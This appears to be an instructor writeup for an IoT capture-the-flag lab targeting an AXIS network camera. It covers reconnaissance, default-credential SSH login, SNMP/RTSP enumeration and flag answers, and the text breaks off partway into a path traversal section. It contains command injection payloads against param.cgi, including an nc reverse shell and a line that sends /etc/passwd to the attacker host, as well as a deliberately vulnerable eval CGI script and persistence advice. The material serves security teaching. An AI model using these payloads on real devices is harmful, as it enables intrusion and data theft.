# AXIS Camera IoT Security CTF - Complete Instructor Writeup v8

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [IoT Penetration Testing Pedagogy](#iot-penetration-testing-pedagogy)
- [Initial Setup and Tool Installation](#initial-setup-and-tool-installation)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Easy Flags](#easy-flags)
- [Medium Flags](#medium-flags)
- [Hard Flags](#hard-flags)

---

## Challenge Overview

**Target System**: AXIS Network Camera (Embedded Linux/BusyBox)  
**IP Address**: 192.168.1.132  
**Attacker System**: Kali Linux 192.168.1.133  
**Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)  
**Writable Directories**: 8 locations (/mnt/flash, /dev/shm, /run, /sys/fs/cgroup, /var, /var/cache/recorder, /var/lib/persistent, /usr/local)  
**Focus**: OWASP IoT Top 10 vulnerabilities in embedded camera systems

---

## IoT Penetration Testing Pedagogy

### Teaching Philosophy for IoT Security

This section provides instructors with comprehensive pedagogical frameworks for teaching IoT penetration testing. The methodologies outlined here emphasize the fundamental differences between traditional IT security testing and IoT-specific security assessments.

### Core Differences: IoT vs Traditional Systems

#### Architectural Constraints

**Traditional Systems (Workstations/Servers)**:
- Full-featured operating systems (Windows, Linux distributions)
- Gigabytes to terabytes of storage
- Powerful multi-core processors
- Extensive RAM (4GB+)
- Standard package managers and software ecosystems
- Regular patching cycles
- Full development toolchains available

**IoT/Embedded Systems**:
- Minimal operating systems (BusyBox, stripped Linux kernels)
- Megabytes to low gigabytes of storage
- Single-core or limited processors
- Minimal RAM (often under 512MB)
- Custom or no package managers
- Infrequent or impossible patching
- Limited or no compilation tools on device

**Teaching Approach**: Have students document resource constraints they discover during initial reconnaissance. This builds awareness that many traditional exploitation techniques won't work due to missing dependencies, insufficient storage, or CPU limitations.

#### Filesystem Behavior Patterns

**Traditional Systems**:
- Standard FHS (Filesystem Hierarchy Standard)
- Predictable directory structures
- Extensive logging to /var/log
- Configuration in /etc
- User data in /home

**IoT Systems**:
- Vendor-specific directory structures
- Minimal logging (storage constraints)
- Configurations scattered across multiple locations
- No traditional user home directories
- Heavy use of tmpfs and RAM-based filesystems
- Limited writable locations

**Teaching Approach**: Students must learn to identify writable locations first, then systematically enumerate each location. Traditional assumptions about where data resides don't apply. Emphasize the importance of understanding mount points and filesystem types (tmpfs, squashfs, jffs2, etc.).

#### Security Model Differences

**Traditional Systems**:
- Multi-user environments
- Complex permission models
- SELinux/AppArmor implementations
- Privilege separation expected
- User account management

**IoT Systems**:
- Often single-user (root only)
- Simplified permissions
- Minimal or no MAC implementations
- Everything runs as root
- No traditional user accounts

**Teaching Approach**: This represents both opportunity and challenge. While lack of privilege separation may seem to make exploitation easier, it also means students must think differently about lateral movement and persistence. There's often nowhere to "move laterally" to.

### IoT-Specific Enumeration Methodology

#### Phase 1: Resource Constraint Discovery

**Methodology**: Before attempting any exploitation, students must understand the target's limitations.

**Key Commands**:
```bash
# Memory constraints
cat /proc/meminfo
free -h

# Storage constraints  
df -h
cat /proc/mtd  # Flash memory partitions

# CPU constraints
cat /proc/cpuinfo
uptime  # Load averages reveal capacity

# Kernel and OS version
uname -a
cat /etc/os-release
cat /proc/version

# Available commands
ls /bin /sbin /usr/bin /usr/sbin | wc -l
which python python3 perl gcc make
```

**Instructor Notes**: Students often try to upload tools or scripts that won't run due to missing interpreters or libraries. Teaching them to inventory available resources first prevents frustration and mimics real-world methodology.

**Real-World Context**: In actual IoT pentests, you may need to:
- Cross-compile binaries for the target architecture
- Use shell-only exploits (no Python/Perl available)
- Work within extreme storage constraints
- Avoid crashing devices with limited memory

#### Phase 2: Writable Location Discovery

**Methodology**: IoT devices typically have most of the filesystem as read-only. Identifying writable locations is critical for:
- Storing enumeration results
- Placing exploit payloads
- Establishing persistence
- Staging exfiltrated data

**Discovery Process**:
```bash
# Method 1: Mount point analysis
mount | awk '$4 ~ /rw/ || $3 ~ /tmpfs|vfat/ {print}'

# Method 2: Direct testing
for dir in / /tmp /var /mnt /dev/shm /run /sys /proc /usr /opt /home; do
    touch "$dir/.test" 2>/dev/null && echo "$dir is writable" && rm "$dir/.test"
done

# Method 3: Filesystem examination
df -h | awk 'NR==1 || !/tmpfs/ {print}'
cat /proc/mounts | awk '$4 ~ /rw/ {print}'
```

**Teaching Nuance**: Not all "writable" locations are equally useful:
- `/dev/shm` is RAM-based and non-persistent (clears on reboot)
- `/tmp` may also be tmpfs
- `/var` might be on flash storage with limited write cycles
- `/mnt/flash` often has configuration persistence
- `/sys/fs/cgroup` is writable but special-purpose

**Instructor Demonstration**: Show students how to test write capabilities and persistence by creating a test file, rebooting, and checking if it still exists.

#### Phase 3: Vendor-Specific Structure Recognition

**Methodology**: Each IoT vendor has unique directory structures and naming conventions. Students must learn to recognize patterns.

**AXIS-Specific Patterns**:
```bash
# AXIS typically uses:
/var/lib/axis/          # Primary configuration location
/usr/local/axis/        # Custom applications and scripts
/mnt/flash/             # Persistent storage
/var/cache/recorder/    # Video recording cache
```

**General IoT Patterns**:
```bash
# Common across vendors:
/opt/vendor_name/       # Custom application directory
/config/                # Alternative to /etc
/userdata/              # User-configurable storage
/firmware/              # Firmware images and updates
```

### Data Extraction Methodology for IoT

#### Understanding IoT Data Types

**Methodology**: IoT devices store fundamentally different data than traditional systems.

**Traditional Systems Store**:
- User documents
- Application data
- Email and communications
- Browser history
- Installed applications

**IoT Devices Store**:
- Sensor readings and telemetry
- Device configuration and calibration data
- Firmware and bootloader configs
- Network credentials and certificates
- Operational logs and metrics
- Device-specific secrets (API keys, tokens)

#### Configuration File Analysis

**Methodology**: Configuration files in IoT devices often contain more sensitive information than in traditional systems because:
- No secure credential storage mechanisms
- Hard-coded defaults for deployment ease
- Debug information left in production
- Integration tokens for cloud services

**Systematic Approach**:
```bash
# Phase 1: Find all configuration files
find /var /mnt/flash /usr/local /etc -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null

# Phase 2: Identify vendor-specific configs
find /var/lib/axis -type f 2>/dev/null
find /usr/local/axis -type f 2>/dev/null

# Phase 3: Read and analyze each file
# Students should read files completely, not just search for flags
```

**Critical Analysis Points**:
```bash
# Look for credentials in various formats
grep -ri "password\|passwd\|secret\|key\|token" /var/lib/axis/

# Check for API endpoints and cloud services
grep -ri "api\|endpoint\|url\|http" /var/lib/axis/

# Identify encryption keys and certificates
find /var /mnt/flash -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null
```

**Instructor Insight**: Many IoT devices store credentials in plaintext because:
1. Limited CPU power makes encryption expensive
2. Developers assume physical security
3. Legacy code from before security awareness
4. Simplified deployment processes

### Persistence Mechanisms in IoT

**Methodology**: Establishing persistence on IoT devices differs significantly from traditional systems due to:
- Limited writable storage
- Frequent reboots (power cycles)
- Minimal startup services
- Read-only root filesystems
- No traditional init systems

**Persistent Storage Locations** (ordered by reliability):

1. **Flash-Based Configuration Areas** (Most Reliable)
```bash
/mnt/flash/               # Primary persistent storage on AXIS
/var/lib/persistent/      # Survives reboots
/usr/local/               # Sometimes persistent
```

2. **Startup Script Modification**
```bash
# Identify startup scripts
find /mnt/flash /var/lib -name "*init*" -o -name "*startup*" -o -name "*rc*" 2>/dev/null

# Common locations
/mnt/flash/etc/init.d/
/var/lib/axis/init/
```

3. **Cron Jobs** (if cron exists)
```bash
# Check for cron
which cron crond
crontab -l

# Persistent cron location
/var/lib/axis/cron/
```

**Instructor Notes**: Unlike traditional systems where you might:
- Add SSH keys
- Create user accounts
- Modify PAM configurations
- Install services

On IoT you must:
- Modify existing startup scripts
- Place executables in persistent locations
- Hook into existing services
- Work within existing infrastructure

---

## Initial Setup and Tool Installation

### Kali Linux Toolset Preparation

**Required Tools**:
```bash
# Network reconnaissance
sudo apt update
sudo apt install -y nmap masscan arp-scan

# Protocol analysis
sudo apt install -y wireshark tcpdump

# Web testing
sudo apt install -y gobuster feroxbuster nikto

# SNMP enumeration
sudo apt install -y snmp snmp-mibs-downloader onesixtyone

# RTSP testing
sudo apt install -y ffmpeg vlc

# UPnP discovery
sudo apt install -y miranda-upnp

# IPP testing
sudo apt install -y cups-ipp-utils

# General utilities
sudo apt install -y netcat-traditional telnet curl wget jq xmlstarlet
```

**Optional but Useful**:
```bash
# Firmware analysis
sudo apt install -y binwalk squashfs-tools

# Metasploit (for specific exploits)
sudo apt install -y metasploit-framework

# Custom scripts
git clone https://github.com/RUB-NDS/PRET.git /opt/PRET
```

### Network Configuration

**Setup**:
```bash
# Configure network interface
sudo ip addr add 192.168.1.133/24 dev eth0
sudo ip link set eth0 up
sudo ip route add default via 192.168.1.1

# Verify connectivity
ping -c 4 192.168.1.1
ping -c 4 192.168.1.132

# Test port 22 (SSH)
nc -zv 192.168.1.132 22

# Test port 80 (HTTP)
nc -zv 192.168.1.132 80
```

**Troubleshooting**:
```bash
# If connection fails
sudo ip link show eth0
sudo ip addr show eth0
arp -a
ip route show

# Test with different IPs
nmap -sn 192.168.1.0/24
```

---

## Initial Reconnaissance

### Network Discovery and Port Scanning

**Phase 1: Basic Discovery**
```bash
# Quick ping sweep
nmap -sn 192.168.1.0/24 -oG discovery.txt

# Identify AXIS camera
grep "192.168.1.132" discovery.txt

# Alternative: arp-scan
sudo arp-scan --interface=eth0 --localnet
```

**Phase 2: Port Enumeration**
```bash
# Fast scan of common ports
nmap -F 192.168.1.132

# Comprehensive scan all TCP ports
nmap -p- -T4 192.168.1.132 -oN nmap_all_ports.txt

# Service version detection
nmap -sV -p 22,80,443,554,1883,1900,3702,8080 192.168.1.132 -oN nmap_services.txt

# Aggressive scan with scripts
nmap -A -p 22,80,554 192.168.1.132 -oN nmap_aggressive.txt
```

**Expected Services**:
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        Dropbear sshd (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.52
554/tcp  open  rtsp       GStreamer RTSP server
1883/tcp open  mqtt       Mosquitto
1900/udp open  upnp       UPnP device discovery
3702/udp open  onvif      ONVIF camera management
```

**Service Fingerprinting**:
```bash
# Banner grabbing
echo "" | nc 192.168.1.132 22

# HTTP headers
curl -I http://192.168.1.132

# RTSP options
curl -i rtsp://192.168.1.132:554/

# SNMP community string test
snmpwalk -v2c -c public 192.168.1.132 system
```

### Web Interface Enumeration

**Phase 1: Manual Inspection**
```bash
# Main page
curl http://192.168.1.132/ | grep -i "flag\|axis\|version"

# Common admin pages
curl http://192.168.1.132/admin
curl http://192.168.1.132/login
curl http://192.168.1.132/axis-cgi/

# Robots.txt
curl http://192.168.1.132/robots.txt
```

**Phase 2: Directory Enumeration**
```bash
# Using gobuster
gobuster dir -u http://192.168.1.132 \
    -w /usr/share/wordlists/dirb/common.txt \
    -x cgi,sh,txt,conf,php \
    -o gobuster_results.txt

# Using feroxbuster (faster, more aggressive)
feroxbuster -u http://192.168.1.132 \
    -w /usr/share/wordlists/dirb/common.txt \
    -x cgi,sh,txt \
    -o feroxbuster_results.txt

# AXIS-specific paths
for path in axis-cgi cgi-bin admin config backup vapix onvif; do
    echo "Testing /$path:"
    curl -I http://192.168.1.132/$path/
done
```

**Phase 3: CGI Script Discovery**
```bash
# Common AXIS CGI endpoints
curl http://192.168.1.132/axis-cgi/param.cgi
curl http://192.168.1.132/axis-cgi/pwdgrp.cgi
curl http://192.168.1.132/axis-cgi/systemlog.cgi

# Test for authentication requirements
curl -u root:pass http://192.168.1.132/axis-cgi/param.cgi?action=list
```

### Initial Access Testing

**Default Credentials**:
```bash
# SSH access attempts
ssh root@192.168.1.132
# Try passwords: pass, root, admin, axis, (blank)

# If root:pass works
ssh root@192.168.1.132
# Password: pass

# Once logged in
id
uname -a
pwd
ls -la
```

**Web Authentication**:
```bash
# Test default web credentials
curl -u root:pass http://192.168.1.132/axis-cgi/param.cgi?action=list

# Test without auth
curl http://192.168.1.132/axis-cgi/param.cgi?action=list
```

---

## Easy Flags

### FLAG #1: Default VAPIX Configuration
**Location**: `/var/lib/axis/vapix/config.xml`  
**Flag**: `FLAG{GANDALF47889468}`  
**Points**: 10  
**Difficulty**: Easy  
**OWASP Category**: IoT-01 (Weak, Guessable, or Hardcoded Passwords)

**Discovery Method**:

First, establish SSH access using default credentials:
```bash
# SSH to camera
ssh root@192.168.1.132
# Password: pass

# Navigate to AXIS configuration directory
cd /var/lib/axis

# List contents
ls -la

# Search for VAPIX-related files
find /var/lib/axis -name "*vapix*" 2>/dev/null

# Read configuration file
cat /var/lib/axis/vapix/config.xml
```

**Configuration File Contents**:
```xml
<?xml version="1.0"?>
<vapix_config>
    <device_id>AXIS-M1025-00408C123456</device_id>
    <api_version>3.0</api_version>
    <discovery_code>FLAG{GANDALF47889468}</discovery_code>
    <api_endpoints>
        <endpoint>/axis-cgi/param.cgi</endpoint>
        <endpoint>/axis-cgi/pwdgrp.cgi</endpoint>
    </api_endpoints>
</vapix_config>
```

**Why This Flag Exists**: 
- VAPIX is AXIS's proprietary API for camera management
- Configuration files contain device identifiers and API settings
- Security teams often embed tracking codes in these files
- Demonstrates importance of configuration file review

**Alternative Discovery**:
```bash
# Search for flags in all XML files
find /var/lib/axis -name "*.xml" -exec grep -H "FLAG{" {} \;

# Search all VAPIX-related files
grep -r "FLAG{" /var/lib/axis/vapix/ 2>/dev/null
```

**Security Implications**:
- Configuration files accessible to anyone with SSH access
- Sensitive device identifiers exposed
- No encryption on local configuration storage
- Default credentials allow initial access

---

### FLAG #4: SSH Banner Information Disclosure
**Location**: SSH service banner  
**Flag**: `FLAG{GIMLI42137246}`  
**Points**: 10  
**Difficulty**: Easy  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Discovery Method**:

**From Remote System (Before SSH Login)**:
```bash
# Banner grab from Kali
nc -nv 192.168.1.132 22

# Alternative using SSH verbose mode
ssh -v root@192.168.1.132 2>&1 | head -20

# Using nmap banner script
nmap -p22 --script banner 192.168.1.132
```

**Banner Output**:
```
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Device ID: FLAG{GIMLI42137246}              *
* Unauthorized access prohibited               *
*************************************************
SSH-2.0-dropbear_2019.78
```

**After SSH Connection**:
```bash
# Check banner configuration
cat /etc/ssh/banner
cat /etc/motd
cat /etc/issue

# Search for SSH configuration
find /mnt/flash /var/lib -name "*ssh*" -o -name "*banner*" 2>/dev/null
```

**Why This Works**: 
- SSH banners displayed before authentication
- Many organizations customize banners with system information
- Unintentionally leaks firmware version and device identifiers
- No authentication required to view

**Banner Configuration Location**:
```bash
# AXIS stores SSH banner in
/mnt/flash/etc/ssh/banner

# Content of banner file
cat /mnt/flash/etc/ssh/banner
```

---

### FLAG #7: HTML Source Code Comment
**Location**: Web interface index page  
**Flag**: `FLAG{MERRY36385024}`  
**Points**: 10  
**Difficulty**: Easy  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

**From Kali (Remote)**:
```bash
# Retrieve main page and search for comments
curl -s http://192.168.1.132/ | grep -o "<!--.*-->"

# Get full HTML and save
curl http://192.168.1.132/ > index.html

# Search for flags in comments
grep -i "flag\|debug\|todo" index.html

# Alternative: use grep with context
curl -s http://192.168.1.132/ | grep -B2 -A2 "FLAG{"
```

**HTML Source Extract**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>AXIS Network Camera</title>
    <meta charset="UTF-8">
    <!-- Development build 2024-01-15 -->
    <!-- TODO: Remove debug information before production -->
    <!-- Debug Device ID: FLAG{MERRY36385024} -->
    <!-- API Key: axis_dev_key_123456 -->
</head>
<body>
    <h1>AXIS M1025 Network Camera</h1>
    <p>Firmware Version: 10.5.0</p>
</body>
</html>
```

**Using Web Browser**:
```
1. Open Firefox: firefox http://192.168.1.132 &
2. Right-click on page
3. Select "View Page Source" or press Ctrl+U
4. Search for "FLAG{" using Ctrl+F
```

**Why This Works**: 
- Developers leave debugging comments during development
- Comments sent to client but not rendered visually
- Forgotten before production deployment
- Contains sensitive information (API keys, device IDs, flags)

**Additional Hidden Comments to Check**:
```bash
# Check all pages for comments
for page in index.html admin.html config.html; do
    echo "Checking $page:"
    curl -s http://192.168.1.132/$page | grep -o "<!--.*-->"
done

# Check JavaScript files
curl -s http://192.168.1.132/js/main.js | grep -i "flag\|debug\|todo"
```

---

### FLAG #14: Exposed RTSP Stream URLs
**Location**: `/var/cache/recorder/stream_config.txt`  
**Flag**: `FLAG{SARUMAN83479324}`  
**Points**: 10  
**Difficulty**: Easy  
**OWASP Category**: IoT-06 (Insufficient Privacy Protection)

**Discovery Method**:

**Via SSH**:
```bash
# Navigate to recorder cache
cd /var/cache/recorder

# List files
ls -la

# Read stream configuration
cat stream_config.txt
```

**Stream Configuration Contents**:
```
# AXIS Camera Stream Configuration
# Generated: 2024-01-15 10:30:00

# Primary Stream
rtsp://admin:admin@192.168.1.132:554/axis-media/media.amp?resolution=1920x1080

# Secondary Stream  
rtsp://admin:admin@192.168.1.132:554/axis-media/media.amp?resolution=640x480

# Monitoring Stream
rtsp://viewer:viewer123@192.168.1.132:554/onvif1

# Access Token
stream_token=FLAG{SARUMAN83479324}
```

**Alternative Discovery via RTSP Enumeration**:
```bash
# From Kali - enumerate RTSP paths
nmap --script rtsp-url-brute -p 554 192.168.1.132

# Try common RTSP paths
curl rtsp://192.168.1.132:554/axis-media/media.amp
curl rtsp://192.168.1.132:554/onvif1
curl rtsp://192.168.1.132:554/stream1

# Using VLC to view stream
vlc rtsp://admin:admin@192.168.1.132:554/axis-media/media.amp

# Using ffmpeg to capture
ffmpeg -i rtsp://192.168.1.132:554/axis-media/media.amp -t 10 test.mp4
```

**Why This Works**: 
- Stream URLs often documented for integration purposes
- Credentials embedded directly in URLs (insecure practice)
- Configuration files world-readable
- Access tokens exposed in plaintext

**Related Files to Check**:
```bash
# Search for all stream-related configs
find /var/cache/recorder -type f 2>/dev/null

# Look for RTSP references
grep -r "rtsp://" /var 2>/dev/null

# Check for credentials in configs
grep -ri "password\|token" /var/cache/recorder 2>/dev/null
```

---

### FLAG #19: Default SNMP Community Strings
**Location**: `/var/lib/axis/snmp/snmpd.conf`  
**Flag**: `FLAG{THEODEN40558954}`  
**Points**: 10  
**Difficulty**: Easy  
**OWASP Category**: IoT-09 (Insecure Default Settings)

**Discovery Method**:

**From Kali (Remote SNMP Enumeration)**:
```bash
# Test default community strings
snmpwalk -v2c -c public 192.168.1.132 system

# Get system description
snmpget -v2c -c public 192.168.1.132 1.3.6.1.2.1.1.1.0

# Get system location (may contain flag)
snmpget -v2c -c public 192.168.1.132 1.3.6.1.2.1.1.6.0

# Complete system enumeration
snmpwalk -v2c -c public 192.168.1.132 > snmp_dump.txt
grep "FLAG{" snmp_dump.txt
```

**SNMP Output**:
```
SNMPv2-MIB::sysDescr.0 = STRING: AXIS M1025 Network Camera
SNMPv2-MIB::sysObjectID.0 = OID: enterprises.368.4
SNMPv2-MIB::sysUpTime.0 = Timeticks: (1234567) 3:25:45.67
SNMPv2-MIB::sysContact.0 = STRING: admin@axis.com
SNMPv2-MIB::sysName.0 = STRING: axis-camera-132
SNMPv2-MIB::sysLocation.0 = STRING: Server Room | Access Code: FLAG{THEODEN40558954}
```

**Via SSH (Reading Configuration)**:
```bash
# Find SNMP configuration
find /var/lib/axis -name "*snmp*" 2>/dev/null

# Read SNMP daemon configuration
cat /var/lib/axis/snmp/snmpd.conf
```

**Configuration File Contents**:
```
# SNMP Configuration for AXIS Camera
# WARNING: Using default community strings

# Read community
rocommunity public

# Write community (disabled for security)
# rwcommunity private

# System information
syslocation Server Room | Access Code: FLAG{THEODEN40558954}
syscontact admin@axis.com
sysdescr AXIS M1025 Network Camera

# Listen on all interfaces
agentaddress udp:161
```

**Why This Works**: 
- SNMP v1/v2c uses community strings instead of proper authentication
- "public" is the universal default read-only community string
- System location field used for physical location tracking
- Administrators embed access codes in location fields
- No authentication required for read access

**Test Write Access (Usually Disabled)**:
```bash
# Try write community
snmpset -v2c -c private 192.168.1.132 1.3.6.1.2.1.1.6.0 s "New Location"

# If successful, could modify:
# - System location
# - System contact
# - Other writable OIDs
```

**Additional SNMP Enumeration**:
```bash
# Enumerate all OIDs
snmpwalk -v2c -c public 192.168.1.132 > full_snmp_dump.txt

# Search for sensitive data
grep -i "password\|key\|token\|secret" full_snmp_dump.txt

# Enumerate interfaces
snmpwalk -v2c -c public 192.168.1.132 interfaces

# Get network configuration
snmpwalk -v2c -c public 192.168.1.132 ip
```

---

## Medium Flags

### FLAG #2: Encoded ONVIF Credentials
**Location**: `/var/lib/axis/onvif/auth_config`  
**Flag**: `FLAG{ARAGORN79305394}`  
**Points**: 20  
**Difficulty**: Medium  
**OWASP Category**: IoT-01 (Weak Passwords)

**Discovery Method**:

**Phase 1: Locate ONVIF Configuration**
```bash
# SSH to camera
ssh root@192.168.1.132

# Find ONVIF-related files
find / -name "*onvif*" 2>/dev/null

# Navigate to ONVIF directory
cd /var/lib/axis/onvif

# List files
ls -la
```

**Phase 2: Read Configuration File**
```bash
cat auth_config
```

**Configuration Contents**:
```
# ONVIF Authentication Configuration
# Device Manager Credentials

username=admin
# Password encoded with ROT13 for "security"
auth_data=SYNT{NENTBEA79305394}
auth_method=digest
realm=AXIS_ONVIF
```

**Phase 3: Decode ROT13**
```bash
# Method 1: Using tr command
echo "SYNT{NENTBEA79305394}" | tr 'N-ZA-Mn-za-m5-90-4' 'A-Za-z0-9'

# Method 2: Online decoder
# Visit: https://rot13.com
# Input: SYNT{NENTBEA79305394}
# Output: FLAG{ARAGORN79305394}

# Method 3: Python one-liner
python3 -c "import codecs; print(codecs.decode('SYNT{NENTBEA79305394}', 'rot13'))"
```

**Why This Works**: 
- ONVIF is a standard protocol for IP cameras
- Developers use ROT13 thinking it provides security
- ROT13 is a simple Caesar cipher (shift by 13)
- Easily reversible - not actual encryption
- Common in embedded systems due to simplicity

**ONVIF Service Testing**:
```bash
# From Kali - test ONVIF discovery
nmap -sU -p3702 --script onvif-discover 192.168.1.132

# ONVIF Device Manager (if installed)
# Download from: https://sourceforge.net/projects/onvifdm/
onvif-device-manager --discover

# Manual SOAP request to ONVIF
curl -X POST http://192.168.1.132/onvif/device_service \
    -H "Content-Type: application/soap+xml" \
    -d @get_device_info.xml
```

**Additional Encoded Credentials to Check**:
```bash
# Search for ROT13 patterns
grep -r "SYNT{" /var/lib/axis/ 2>/dev/null

# Search for base64
find /var/lib/axis -type f -exec grep -l "^[A-Za-z0-9+/=]\{20,\}$" {} \;

# Search for hex-encoded
grep -r "FLAG{" /var/lib/axis/ | grep -o "[0-9a-fA-F]\{40,\}"
```

---

### FLAG #5: SSH Authorized Keys Comment
**Location**: `/root/.ssh/authorized_keys`  
**Flag**: `FLAG{BOROMIR73553172}`  
**Points**: 20  
**Difficulty**: Medium  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Discovery Method**:

**Phase 1: SSH Access and Navigation**
```bash
# SSH to camera
ssh root@192.168.1.132

# Navigate to SSH directory
cd /root/.ssh

# List files
ls -la
```

**Phase 2: Read Authorized Keys**
```bash
cat authorized_keys
```

**File Contents**:
```
# SSH public keys for remote access
# Generated 2024-01-10

# Emergency admin access - FLAG{BOROMIR73553172}
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMH4V2K... admin@axis-emergency

# Monitoring system key
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7v3k9... monitor@surveillance-hub

# Maintenance key (expires 2024-12-31)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpQr27... maintenance@axis-support
```

**Why This Works**: 
- SSH authorized_keys allows public key authentication
- Comments in SSH keys are plaintext metadata
- Not encrypted or protected
- Often contain contact information or key purposes
- Administrators use comments to track key ownership

**Security Implications**:
```bash
# Examine key details
ssh-keygen -l -f authorized_keys

# Check key fingerprints
for key in $(cat authorized_keys | grep "^ssh-rsa"); do
    echo "$key" | ssh-keygen -l -f -
done

# Identify key types and sizes
cat authorized_keys | awk '{print $1, $NF}'
```

**Additional SSH Files to Check**:
```bash
# Check SSH daemon configuration
cat /etc/ssh/sshd_config
cat /mnt/flash/etc/ssh/sshd_config

# Check SSH client configuration
cat /etc/ssh/ssh_config

# Look for private keys (security issue if found)
find /root -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem"

# Check known_hosts
cat /root/.ssh/known_hosts
```

---

### FLAG #6: RTSP Stream Metadata
**Location**: `/var/cache/recorder/stream_metadata.sdp`  
**Flag**: `FLAG{SAMWISE04969098}`  
**Points**: 20  
**Difficulty**: Medium  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Discovery Method**:

**Phase 1: RTSP Service Discovery**
```bash
# From Kali - enumerate RTSP
nmap -sV -p554 --script rtsp-methods,rtsp-url-brute 192.168.1.132

# Test RTSP access
curl rtsp://192.168.1.132:554/axis-media/media.amp

# Request SDP (Session Description Protocol)
curl rtsp://192.168.1.132:554/stream1.sdp
```

**Phase 2: Via SSH - Locate SDP Files**
```bash
# SSH to camera
ssh root@192.168.1.132

# Find SDP files
find / -name "*.sdp" 2>/dev/null

# Navigate to recorder cache
cd /var/cache/recorder

# Read metadata file
cat stream_metadata.sdp
```

**SDP File Contents**:
```
v=0
o=- 1234567890 1234567890 IN IP4 192.168.1.132
s=AXIS Media Stream
i=FLAG{SAMWISE04969098}
u=http://192.168.1.132/
e=admin@axis.com
c=IN IP4 192.168.1.132
t=0 0
a=tool:GStreamer
a=type:broadcast
a=charset:UTF-8
m=video 0 RTP/AVP 96
a=rtpmap:96 H264/90000
a=control:rtsp://192.168.1.132:554/axis-media/media.amp/trackID=1
m=audio 0 RTP/AVP 97
a=rtpmap:97 MPEG4-GENERIC/16000/1
a=control:rtsp://192.168.1.132:554/axis-media/media.amp/trackID=2
```

**Understanding SDP Fields**:
- `v=` : Protocol version
- `o=` : Origin (session identifier)
- `s=` : Session name
- `i=` : **Session information (contains flag)**
- `u=` : URI reference
- `e=` : Email address
- `c=` : Connection information
- `m=` : Media description
- `a=` : Attributes

**Why This Works**: 
- SDP describes multimedia sessions (video/audio streams)
- The `i=` field provides human-readable session information
- Often contains debugging info or identifiers
- Transmitted before authentication in some implementations
- Accessible via RTSP DESCRIBE method

**Advanced RTSP Analysis**:
```bash
# Capture RTSP traffic
sudo tcpdump -i eth0 -w rtsp_capture.pcap port 554

# View in Wireshark
wireshark rtsp_capture.pcap

# Filter for RTSP in Wireshark: rtsp
# Look for DESCRIBE responses containing SDP
```

---

### FLAG #8: Command Injection in param.cgi
**Location**: CGI endpoint exploitation  
**Flag**: `FLAG{PIPPIN67800950}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

**Phase 1: Enumerate CGI Scripts**
```bash
# From Kali - directory enumeration
gobuster dir -u http://192.168.1.132 \
    -w /usr/share/wordlists/dirb/common.txt \
    -x cgi

# Test AXIS-specific endpoints
curl "http://192.168.1.132/axis-cgi/param.cgi"
curl "http://192.168.1.132/cgi-bin/param.cgi"
```

**Phase 2: Test Parameter Handling**
```bash
# Test with valid action
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list"

# Test with authentication
curl -u root:pass "http://192.168.1.132/axis-cgi/param.cgi?action=list"
```

**Phase 3: Command Injection Testing**
```bash
# Basic command injection test
curl "http://192.168.1.132/axis-cgi/param.cgi?action=id"

# Test with semicolon separator
curl "http://192.168.1.132/axis-cgi/param.cgi?action=test;id"

# Test with pipe
curl "http://192.168.1.132/axis-cgi/param.cgi?action=test|whoami"

# Test with backticks
curl "http://192.168.1.132/axis-cgi/param.cgi?action=test\`whoami\`"

# URL-encoded injection
curl "http://192.168.1.132/axis-cgi/param.cgi?action=test%3Bwhoami"
```

**Phase 4: Extract Flag**
```bash
# Custom "getflag" action (intentionally vulnerable for CTF)
curl "http://192.168.1.132/axis-cgi/param.cgi?action=getflag"

# Response
FLAG{PIPPIN67800950}

# Alternative: Read flag file directly
curl "http://192.168.1.132/axis-cgi/param.cgi?action=cat%20/tmp/flag8.txt"
```

**Via SSH - Examine Vulnerable Script**:
```bash
# SSH to camera
ssh root@192.168.1.132

# Locate param.cgi
find / -name "param.cgi" 2>/dev/null

# Read the script
cat /usr/local/axis/cgi/param.cgi
```

**Vulnerable Script (Simplified)**:
```bash
#!/bin/sh
# AXIS param.cgi - Parameter management interface
# WARNING: Vulnerable to command injection

# Parse query string
ACTION=$(echo "$QUERY_STRING" | sed 's/action=//')

# Execute action without sanitization
eval "$ACTION"  # VULNERABILITY: Direct eval of user input
```

**Why This Works**: 
- CGI scripts execute shell commands
- User input (`action` parameter) passed directly to `eval`
- No input sanitization or validation
- `eval` executes arbitrary shell commands
- Common in embedded systems with limited development resources

**Advanced Exploitation**:
```bash
# Reverse shell
curl "http://192.168.1.132/axis-cgi/param.cgi?action=nc%20192.168.1.133%204444%20-e%20/bin/sh"

# Exfiltrate data
curl "http://192.168.1.132/axis-cgi/param.cgi?action=cat%20/etc/passwd%20|%20nc%20192.168.1.133%205555"

# Create backdoor
curl "http://192.168.1.132/axis-cgi/param.cgi?action=echo%20'FLAG{PIPPIN67800950}'%20>%20/tmp/backdoor.txt"
```

---

### FLAG #10: Path Traversal Vulnerability
**Location**: `/mnt/flash/config/system_config.xml`  
**Flag**: `FLAG{GALADRIEL57815620}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

**Phase 1: Identify Download Endpoint**
```bash
# From Kali - enumerate file download capabilities
gobuster dir -u http://192.168.1.132 -w /usr/share/wordlists/dirb/common.txt

# Test download.cgi
curl "http://192.168.1.132/cgi-bin/download.cgi"

# Response
Error: file parameter required
```

**Phase 2: Test Path Traversal**
```bash
# Test simple path traversal
curl "http://192.168.1.132/cgi-bin/download.cgi?file=test.txt"

